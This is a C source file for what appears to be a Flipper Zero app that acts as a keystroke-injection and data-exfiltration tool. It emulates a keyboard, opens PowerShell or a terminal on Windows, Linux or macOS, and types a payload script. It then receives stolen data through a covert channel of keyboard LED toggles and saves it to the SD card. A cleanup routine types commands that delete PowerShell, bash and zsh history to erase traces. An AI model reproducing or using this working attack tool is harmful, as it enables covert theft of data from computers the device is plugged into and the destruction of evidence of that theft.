#include "hid_exfil_worker.h"
#include "hid_exfil_payloads.h"
#include <furi.h>
#include <furi_hal.h>
#include <furi_hal_usb_hid.h>
#include <storage/storage.h>
#include <datetime/datetime.h>

#define TAG "HidExfilWorker"

/* ---- HID keyboard key mappings for typing characters ---- */

typedef struct {
    char ch;
    uint16_t hid_key;
    bool shift;
} CharKeyMap;

/* Map printable ASCII to HID key codes.
 * We handle the common US keyboard layout. */
static uint16_t char_to_hid_key(char c, bool* need_shift) {
    *need_shift = false;

    /* Lowercase letters */
    if(c >= 'a' && c <= 'z') {
        return HID_KEYBOARD_A + (c - 'a');
    }
    /* Uppercase letters */
    if(c >= 'A' && c <= 'Z') {
        *need_shift = true;
        return HID_KEYBOARD_A + (c - 'A');
    }
    /* Digits */
    if(c >= '1' && c <= '9') {
        return HID_KEYBOARD_1 + (c - '1');
    }
    if(c == '0') return HID_KEYBOARD_0;

    /* Special characters */
    switch(c) {
    case ' ':
        return HID_KEYBOARD_SPACEBAR;
    case '\n':
        return HID_KEYBOARD_RETURN;
    case '\r':
        return 0; /* skip carriage return, newline handles enter */
    case '\t':
        return HID_KEYBOARD_TAB;
    case '-':
        return HID_KEYBOARD_MINUS;
    case '=':
        return HID_KEYBOARD_EQUAL_SIGN;
    case '[':
        return HID_KEYBOARD_OPEN_BRACKET;
    case ']':
        return HID_KEYBOARD_CLOSE_BRACKET;
    case '\\':
        return HID_KEYBOARD_BACKSLASH;
    case ';':
        return HID_KEYBOARD_SEMICOLON;
    case '\'':
        return HID_KEYBOARD_APOSTROPHE;
    case '`':
        return HID_KEYBOARD_GRAVE_ACCENT;
    case ',':
        return HID_KEYBOARD_COMMA;
    case '.':
        return HID_KEYBOARD_DOT;
    case '/':
        return HID_KEYBOARD_SLASH;

    /* Shifted special characters */
    case '!':
        *need_shift = true;
        return HID_KEYBOARD_1;
    case '@':
        *need_shift = true;
        return HID_KEYBOARD_2;
    case '#':
        *need_shift = true;
        return HID_KEYBOARD_3;
    case '$':
        *need_shift = true;
        return HID_KEYBOARD_4;
    case '%':
        *need_shift = true;
        return HID_KEYBOARD_5;
    case '^':
        *need_shift = true;
        return HID_KEYBOARD_6;
    case '&':
        *need_shift = true;
        return HID_KEYBOARD_7;
    case '*':
        *need_shift = true;
        return HID_KEYBOARD_8;
    case '(':
        *need_shift = true;
        return HID_KEYBOARD_9;
    case ')':
        *need_shift = true;
        return HID_KEYBOARD_0;
    case '_':
        *need_shift = true;
        return HID_KEYBOARD_MINUS;
    case '+':
        *need_shift = true;
        return HID_KEYBOARD_EQUAL_SIGN;
    case '{':
        *need_shift = true;
        return HID_KEYBOARD_OPEN_BRACKET;
    case '}':
        *need_shift = true;
        return HID_KEYBOARD_CLOSE_BRACKET;
    case '|':
        *need_shift = true;
        return HID_KEYBOARD_BACKSLASH;
    case ':':
        *need_shift = true;
        return HID_KEYBOARD_SEMICOLON;
    case '"':
        *need_shift = true;
        return HID_KEYBOARD_APOSTROPHE;
    case '~':
        *need_shift = true;
        return HID_KEYBOARD_GRAVE_ACCENT;
    case '<':
        *need_shift = true;
        return HID_KEYBOARD_COMMA;
    case '>':
        *need_shift = true;
        return HID_KEYBOARD_DOT;
    case '?':
        *need_shift = true;
        return HID_KEYBOARD_SLASH;

    default:
        return HID_KEYBOARD_SPACEBAR; /* fallback */
    }
}

/* Type a single character via HID */
static void type_char(char c, uint32_t delay_ms) {
    if(c == '\r') return; /* skip CR */

    bool need_shift = false;
    uint16_t key = char_to_hid_key(c, &need_shift);
    if(key == 0) return;

    if(need_shift) {
        furi_hal_hid_kb_press(KEY_MOD_LEFT_SHIFT | key);
        furi_delay_ms(delay_ms);
        furi_hal_hid_kb_release(KEY_MOD_LEFT_SHIFT | key);
    } else {
        furi_hal_hid_kb_press(key);
        furi_delay_ms(delay_ms);
        furi_hal_hid_kb_release(key);
    }
    furi_delay_ms(delay_ms);
}

/* Type a string via HID keyboard */
static void type_string(const char* str, uint32_t delay_ms, HidExfilWorker* worker) {
    while(*str && worker->running && !worker->state.abort_requested) {
        /* Check for pause */
        while(worker->state.paused && worker->running && !worker->state.abort_requested) {
            furi_delay_ms(50);
        }
        type_char(*str, delay_ms);
        str++;
    }
}

/* Press a key combo (e.g., GUI+R) */
static void press_key_combo(uint16_t key, uint32_t hold_ms) {
    furi_hal_hid_kb_press(key);
    furi_delay_ms(hold_ms);
    furi_hal_hid_kb_release(key);
    furi_delay_ms(50);
}

/* ---- Phase 1: Open terminal and inject payload ---- */

static bool phase_inject(HidExfilWorker* worker) {
    FURI_LOG_I(TAG, "Phase: Injecting");
    worker->state.phase = PhaseInjecting;
    if(worker->callback) {
        worker->callback(PhaseInjecting, 0, worker->callback_context);
    }

    uint32_t delay = worker->config.injection_speed_ms;

    /* Open terminal based on target OS */
    switch(worker->config.target_os) {
    case TargetOSWindows:
        /* Win+R to open Run dialog */
        press_key_combo(KEY_MOD_LEFT_GUI | HID_KEYBOARD_R, 50);
        furi_delay_ms(500);
        /* Type "powershell" and press Enter */
        type_string("powershell", delay, worker);
        if(worker->state.abort_requested) return false;
        furi_delay_ms(100);
        press_key_combo(HID_KEYBOARD_RETURN, 30);
        /* Wait for PowerShell to open */
        furi_delay_ms(1500);
        break;

    case TargetOSLinux:
        /* Ctrl+Alt+T to open terminal */
        press_key_combo(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T, 50);
        furi_delay_ms(1000);
        break;

    case TargetOSMac:
        /* Cmd+Space for Spotlight */
        press_key_combo(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR, 50);
        furi_delay_ms(500);
        /* Type "terminal" and Enter */
        type_string("terminal", delay, worker);
        if(worker->state.abort_requested) return false;
        furi_delay_ms(100);
        press_key_combo(HID_KEYBOARD_RETURN, 30);
        furi_delay_ms(1500);
        break;

    default:
        break;
    }

    if(!worker->running || worker->state.abort_requested) return false;

    /* Get the payload script */
    const char* script =
        hid_exfil_get_payload_script(worker->payload_type, worker->config.target_os);

    /* Type the script */
    type_string(script, delay, worker);
    if(worker->state.abort_requested) return false;

    /* Press Enter to execute */
    furi_delay_ms(100);
    press_key_combo(HID_KEYBOARD_RETURN, 30);
    furi_delay_ms(500);

    return worker->running && !worker->state.abort_requested;
}

/* ---- Phase 2: Synchronization via Scroll Lock toggles ---- */

static bool phase_sync(HidExfilWorker* worker) {
    FURI_LOG_I(TAG, "Phase: Syncing");
    worker->state.phase = PhaseSyncing;
    if(worker->callback) {
        worker->callback(PhaseSyncing, 0, worker->callback_context);
    }

    /* Send 3 Scroll Lock toggles to signal ready */
    for(int i = 0; i < HID_EXFIL_SYNC_TOGGLES; i++) {
        if(!worker->running || worker->state.abort_requested) return false;
        furi_hal_hid_kb_press(HID_KEYBOARD_SCROLL_LOCK);
        furi_delay_ms(30);
        furi_hal_hid_kb_release(HID_KEYBOARD_SCROLL_LOCK);
        furi_delay_ms(HID_EXFIL_SYNC_INTERVAL_MS);
    }

    /* Wait for target to toggle Scroll Lock back (acknowledgment) */
    uint8_t prev_led = furi_hal_hid_get_led_state();
    uint8_t prev_scroll = prev_led & HID_KB_LED_SCROLL;
    uint32_t timeout_start = furi_get_tick();

    while(worker->running && !worker->state.abort_requested) {
        uint8_t led = furi_hal_hid_get_led_state();
        uint8_t cur_scroll = led & HID_KB_LED_SCROLL;

        /* Update LED state for UI */
        worker->state.led_num = (led & HID_KB_LED_NUM) ? 1 : 0;
        worker->state.led_caps = (led & HID_KB_LED_CAPS) ? 1 : 0;
        worker->state.led_scroll = (led & HID_KB_LED_SCROLL) ? 1 : 0;

        if(cur_scroll != prev_scroll) {
            FURI_LOG_I(TAG, "Sync acknowledged by target");
            return true;
        }

        if(furi_get_tick() - timeout_start > furi_ms_to_ticks(5000)) {
            FURI_LOG_W(TAG, "Sync timeout - no acknowledgment from target");
            /* Try again - target script might still be initializing */
            timeout_start = furi_get_tick();

            /* Re-send sync toggles */
            for(int i = 0; i < HID_EXFIL_SYNC_TOGGLES; i++) {
                if(!worker->running || worker->state.abort_requested) return false;
                furi_hal_hid_kb_press(HID_KEYBOARD_SCROLL_LOCK);
                furi_delay_ms(30);
                furi_hal_hid_kb_release(HID_KEYBOARD_SCROLL_LOCK);
                furi_delay_ms(HID_EXFIL_SYNC_INTERVAL_MS);
            }
            prev_led = furi_hal_hid_get_led_state();
            prev_scroll = prev_led & HID_KB_LED_SCROLL;
        }

        furi_delay_ms(1);
    }

    return false;
}

/* ---- Phase 3: Receive data via LED channel ---- */

static bool phase_receive(HidExfilWorker* worker) {
    FURI_LOG_I(TAG, "Phase: Receiving");
    worker->state.phase = PhaseReceiving;
    worker->state.bytes_received = 0;
    if(worker->callback) {
        worker->callback(PhaseReceiving, 0, worker->callback_context);
    }

    uint8_t prev_led = furi_hal_hid_get_led_state();
    uint8_t prev_scroll = prev_led & HID_KB_LED_SCROLL;
    uint32_t last_clock_tick = furi_get_tick();

    uint8_t current_byte = 0;
    uint8_t dibit_count = 0; /* 0..3, we need 4 dibits per byte */

    /* EOT detection: count consecutive all-LED toggles.
     * When the first EOT toggle is detected we snapshot the receive state
     * (bytes_received + partial dibit accumulator) so that if the full
     * 3-toggle EOT pattern completes we can rewind and discard the
     * spurious dibits that the EOT toggles injected into the data stream. */
    uint8_t eot_count = 0;
    uint8_t prev_all_state = prev_led & (HID_KB_LED_NUM | HID_KB_LED_CAPS | HID_KB_LED_SCROLL);
    uint32_t eot_snapshot_bytes = 0;

    while(worker->running && !worker->state.abort_requested) {
        /* Handle pause */
        while(worker->state.paused && worker->running && !worker->state.abort_requested) {
            furi_delay_ms(50);
            last_clock_tick = furi_get_tick(); /* reset timeout during pause */
        }

        uint8_t led = furi_hal_hid_get_led_state();
        uint8_t cur_scroll = led & HID_KB_LED_SCROLL;

        /* Update LED indicators for UI */
        worker->state.led_num = (led & HID_KB_LED_NUM) ? 1 : 0;
        worker->state.led_caps = (led & HID_KB_LED_CAPS) ? 1 : 0;
        worker->state.led_scroll = (led & HID_KB_LED_SCROLL) ? 1 : 0;

        /* Detect Scroll Lock transition (clock edge) */
        if(cur_scroll != prev_scroll) {
            last_clock_tick = furi_get_tick();

            /* Snapshot bytes_received BEFORE this dibit is accumulated.
             * Used by EOT detection to rewind to the pre-EOT state. */
            uint32_t pre_dibit_bytes = worker->state.bytes_received;

            /* Read data bits: Caps Lock = bit1, Num Lock = bit0 */
            uint8_t caps_bit = (led & HID_KB_LED_CAPS) ? 1 : 0;
            uint8_t num_bit = (led & HID_KB_LED_NUM) ? 1 : 0;
            uint8_t dibit = (caps_bit << 1) | num_bit;

            /* Shift dibit into current byte (MSB first) */
            current_byte = (current_byte << 2) | dibit;
            dibit_count++;

            if(dibit_count >= 4) {
                /* We have a complete byte */
                if(worker->state.bytes_received < worker->recv_buffer_size) {
                    worker->recv_buffer[worker->state.bytes_received] = current_byte;
                    worker->state.bytes_received++;

                    /* Update UI periodically */
                    if((worker->state.bytes_received % 32) == 0 && worker->callback) {
                        worker->callback(
                            PhaseReceiving,
                            worker->state.bytes_received,
                            worker->callback_context);
                    }
                }
                current_byte = 0;
                dibit_count = 0;
            }

            /* Check for EOT: all 3 LEDs toggled simultaneously */
            uint8_t cur_all = led & (HID_KB_LED_NUM | HID_KB_LED_CAPS | HID_KB_LED_SCROLL);
            if(cur_all != prev_all_state) {
                /* Check if ALL bits changed */
                uint8_t changed = cur_all ^ prev_all_state;
                if(changed == (HID_KB_LED_NUM | HID_KB_LED_CAPS | HID_KB_LED_SCROLL)) {
                    if(eot_count == 0) {
                        /* First EOT toggle: snapshot the byte count from
                         * before this dibit was accumulated. This is the
                         * last known-good count of real data bytes. */
                        eot_snapshot_bytes = pre_dibit_bytes;
                    }
                    eot_count++;
                    FURI_LOG_D(TAG, "EOT toggle %d/3 detected", eot_count);
                    if(eot_count >= HID_EXFIL_EOT_TOGGLES) {
                        /* Rewind to the snapshot taken before the first
                         * EOT dibit. The 3 EOT dibits are not real data;
                         * discard any bytes they may have completed. */
                        worker->state.bytes_received = eot_snapshot_bytes;
                        FURI_LOG_I(
                            TAG,
                            "End of transmission detected, %lu bytes received",
                            (unsigned long)worker->state.bytes_received);
                        if(worker->callback) {
                            worker->callback(
                                PhaseReceiving,
                                worker->state.bytes_received,
                                worker->callback_context);
                        }
                        return true;
                    }
                } else {
                    eot_count = 0;
                }
                prev_all_state = cur_all;
            }

            prev_scroll = cur_scroll;
        }

        /* Clock timeout detection */
        if(furi_get_tick() - last_clock_tick > furi_ms_to_ticks(HID_EXFIL_CLOCK_TIMEOUT_MS)) {
            if(worker->state.bytes_received > 0) {
                FURI_LOG_W(
                    TAG,
                    "Clock timeout after %lu bytes, assuming end of data",
                    (unsigned long)worker->state.bytes_received);
                return true;
            } else {
                FURI_LOG_W(TAG, "Clock timeout with no data received");
                /* Reset and wait more */
                last_clock_tick = furi_get_tick();
            }
        }

        furi_delay_ms(HID_EXFIL_LED_POLL_INTERVAL_MS);
    }

    return worker->state.bytes_received > 0;
}

/* ---- Phase 4: Cleanup - clear history and close terminal ---- */

static void phase_cleanup(HidExfilWorker* worker) {
    if(!worker->config.cleanup_enabled) return;

    FURI_LOG_I(TAG, "Phase: Cleanup");
    worker->state.phase = PhaseCleanup;
    if(worker->callback) {
        worker->callback(PhaseCleanup, worker->state.bytes_received, worker->callback_context);
    }

    uint32_t delay = worker->config.injection_speed_ms;

    switch(worker->config.target_os) {
    case TargetOSWindows:
        /* Clear PowerShell history and close */
        furi_delay_ms(300);
        type_string(
            "Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue\r\n",
            delay,
            worker);
        furi_delay_ms(200);
        type_string("Clear-History\r\n", delay, worker);
        furi_delay_ms(200);
        type_string("exit\r\n", delay, worker);
        break;

    case TargetOSLinux:
        /* Clear bash history and close */
        furi_delay_ms(300);
        type_string("history -c && history -w\r\n", delay, worker);
        furi_delay_ms(200);
        type_string("rm -f ~/.bash_history\r\n", delay, worker);
        furi_delay_ms(200);
        type_string("exit\r\n", delay, worker);
        break;

    case TargetOSMac:
        /* Clear zsh history and close */
        furi_delay_ms(300);
        type_string("rm -f ~/.zsh_history ~/.bash_history\r\n", delay, worker);
        furi_delay_ms(200);
        type_string("history -p\r\n", delay, worker);
        furi_delay_ms(200);
        type_string("exit\r\n", delay, worker);
        break;

    default:
        break;
    }

    furi_delay_ms(500);
}

/* ---- Save received data to SD card ---- */

static void save_received_data(HidExfilWorker* worker) {
    if(worker->state.bytes_received == 0) return;

    Storage* storage = furi_record_open(RECORD_STORAGE);

    /* Ensure directory exists */
    storage_simply_mkdir(storage, HID_EXFIL_DATA_DIR);

    /* Build timestamped filename */
    DateTime dt;
    datetime_timestamp_to_datetime(furi_hal_rtc_get_timestamp(), &dt);

    FuriString* path = furi_string_alloc_printf(
        "%s/%04d%02d%02d_%02d%02d%02d_%s.txt",
        HID_EXFIL_DATA_DIR,
        dt.year,
        dt.month,
        dt.day,
        dt.hour,
        dt.minute,
        dt.second,
        hid_exfil_get_payload_label(worker->payload_type));

    /* Replace spaces in filename */
    for(size_t i = 0; i < furi_string_size(path); i++) {
        if(furi_string_get_char(path, i) == ' ') {
            furi_string_set_char(path, i, '_');
        }
    }

    File* file = storage_file_alloc(storage);
    if(storage_file_open(file, furi_string_get_cstr(path), FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
        storage_file_write(file, worker->recv_buffer, worker->state.bytes_received);
        FURI_LOG_I(
            TAG,
            "Saved %lu bytes to %s",
            (unsigned long)worker->state.bytes_received,
            furi_string_get_cstr(path));
    } else {
        FURI_LOG_E(TAG, "Failed to save data to %s", furi_string_get_cstr(path));
    }

    storage_file_close(file);
    storage_file_free(file);
    furi_string_free(path);
    furi_record_close(RECORD_STORAGE);
}

/* ---- Worker thread entry point ---- */

static int32_t hid_exfil_worker_thread(void* context) {
    HidExfilWorker* worker = context;
    furi_assert(worker);

    FURI_LOG_I(TAG, "Worker thread started");

    worker->state.start_tick = furi_get_tick();
    worker->state.bytes_received = 0;
    worker->state.phase = PhaseIdle;
    worker->state.paused = false;
    worker->state.abort_requested = false;

    bool success = true;

    /* Phase 1: Inject payload */
    if(success && worker->running) {
        success = phase_inject(worker);
        if(!success) {
            FURI_LOG_E(TAG, "Injection phase failed or aborted");
        }
    }

    /* Phase 2: Synchronize */
    if(success && worker->running && !worker->state.abort_requested) {
        success = phase_sync(worker);
        if(!success) {
            FURI_LOG_E(TAG, "Sync phase failed or aborted");
        }
    }

    /* Phase 3: Receive data */
    if(success && worker->running && !worker->state.abort_requested) {
        success = phase_receive(worker);
        if(!success) {
            FURI_LOG_W(TAG, "Receive phase ended without data");
        }
    }

    /* Phase 4: Cleanup */
    if(worker->running && !worker->state.abort_requested) {
        phase_cleanup(worker);
    }

    /* Save data if we got any */
    if(worker->state.bytes_received > 0) {
        save_received_data(worker);
    }

    /* Set final phase */
    if(worker->state.abort_requested) {
        worker->state.phase = PhaseError;
    } else if(worker->state.bytes_received > 0) {
        worker->state.phase = PhaseDone;
    } else {
        worker->state.phase = PhaseError;
    }

    if(worker->callback) {
        worker->callback(
            worker->state.phase, worker->state.bytes_received, worker->callback_context);
    }

    worker->running = false;
    FURI_LOG_I(TAG, "Worker thread finished");
    return 0;
}

/* ---- Public API ---- */

HidExfilWorker* hid_exfil_worker_alloc(void) {
    HidExfilWorker* worker = malloc(sizeof(HidExfilWorker));
    if(!worker) return NULL;
    memset(worker, 0, sizeof(HidExfilWorker));

    /* recv_buffer is intentionally NOT allocated here.
     * It is deferred to hid_exfil_worker_start() so that 4 KB of heap
     * is only consumed when the user actually begins an exfil run,
     * not every time the app opens. */

    worker->thread = furi_thread_alloc_ex("HidExfilWorker", 2048, hid_exfil_worker_thread, worker);

    return worker;
}

void hid_exfil_worker_free(HidExfilWorker* worker) {
    furi_assert(worker);

    if(worker->running) {
        hid_exfil_worker_stop(worker);
    }

    /* Always join the thread before freeing, even if the worker
     * finished normally (running == false). furi_thread_join is
     * safe to call on an already-finished thread. */
    furi_thread_join(worker->thread);

    furi_thread_free(worker->thread);

    if(worker->recv_buffer) {
        free(worker->recv_buffer);
    }

    free(worker);
}

void hid_exfil_worker_set_callback(
    HidExfilWorker* worker,
    HidExfilWorkerCallback callback,
    void* context) {
    furi_assert(worker);
    worker->callback = callback;
    worker->callback_context = context;
}

void hid_exfil_worker_configure(
    HidExfilWorker* worker,
    PayloadType payload_type,
    ExfilConfig* config) {
    furi_assert(worker);
    furi_assert(config);
    worker->payload_type = payload_type;
    memcpy(&worker->config, config, sizeof(ExfilConfig));
}

bool hid_exfil_worker_start(HidExfilWorker* worker) {
    furi_assert(worker);
    furi_assert(!worker->running);

    /* Allocate receive buffer now — deferred from worker_alloc.
     * If a previous run already allocated it, reuse it (no free/realloc). */
    if(!worker->recv_buffer) {
        worker->recv_buffer = malloc(HID_EXFIL_RECV_BUF_SIZE);
        if(!worker->recv_buffer) {
            FURI_LOG_E(TAG, "OOM: cannot allocate %u-byte recv buffer", HID_EXFIL_RECV_BUF_SIZE);
            return false;
        }
        worker->recv_buffer_size = HID_EXFIL_RECV_BUF_SIZE;
    }

    /* Zero only the portion we will use (full buffer on first run). */
    memset(worker->recv_buffer, 0, worker->recv_buffer_size);
    worker->state.bytes_received = 0;

    worker->running = true;
    furi_thread_start(worker->thread);
    return true;
}

void hid_exfil_worker_stop(HidExfilWorker* worker) {
    furi_assert(worker);
    worker->running = false;
    worker->state.abort_requested = true;
    furi_thread_join(worker->thread);
}

void hid_exfil_worker_toggle_pause(HidExfilWorker* worker) {
    furi_assert(worker);
    worker->state.paused = !worker->state.paused;
}

void hid_exfil_worker_abort(HidExfilWorker* worker) {
    furi_assert(worker);
    worker->state.abort_requested = true;
}

bool hid_exfil_worker_is_running(HidExfilWorker* worker) {
    furi_assert(worker);
    return worker->running;
}

ExfilState hid_exfil_worker_get_state(HidExfilWorker* worker) {
    furi_assert(worker);
    return worker->state;
}

uint8_t* hid_exfil_worker_get_data(HidExfilWorker* worker, uint32_t* out_len) {
    furi_assert(worker);
    if(out_len) {
        *out_len = worker->state.bytes_received;
    }
    return worker->recv_buffer;
}
